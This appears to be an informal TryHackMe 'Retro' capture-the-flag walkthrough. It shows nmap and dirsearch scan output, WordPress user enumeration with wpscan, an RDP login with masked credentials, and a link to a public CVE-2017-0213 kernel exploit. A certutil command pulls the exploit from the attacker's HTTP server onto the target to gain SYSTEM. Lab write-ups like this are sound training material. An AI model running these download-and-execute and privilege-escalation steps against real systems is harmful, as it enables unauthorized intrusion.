```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
|_  System_Time: 2026-01-04T07:05:37+00:00
|_ssl-date: 2026-01-04T07:05:45+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=RetroWeb
| Not valid before: 2026-01-03T06:56:11
|_Not valid after:  2026-07-05T06:56:11
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012|2016 (85%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

```
└─$ dirsearch -u http://10.64.179.107 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r

Output File: /home/kali/tryhackme/retro/reports/http_10.64.179.107/_26-01-04_02-09-58.txt

Target: http://10.64.179.107/

[02:09:58] Starting: 
[02:12:32] 301 -  150B  - /retro  ->  http://10.64.179.107/retro/           
Added to the queue: retro/

```

so after open I found website use wordpress wia `wapplyzer` and use wpscan and found user 

```
[i] User(s) Identified:

[+] wa......
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.64.179.107/retro/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] .......
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

```

in we potral gives a note so find it and can login 

```
xfreerdp3 /v:10.64.179.107 /u:w... /p:pa.... /dynamic-resolution /clipboard:direction-to:all,files-to:all
```

You’ll find a link to an exploit for [https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2017-0213](https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2017-0213)

to get that into windows i use `curl` `wget` `nc` not work i use this to get that into victim machine

```
python3 -m http.server - victim machine

certutil -urlcache -f http://192.168.153.193/CVE-2017-0213_x64.exe CVE-2017-0213_x64.exe
```

and you automatically going to system32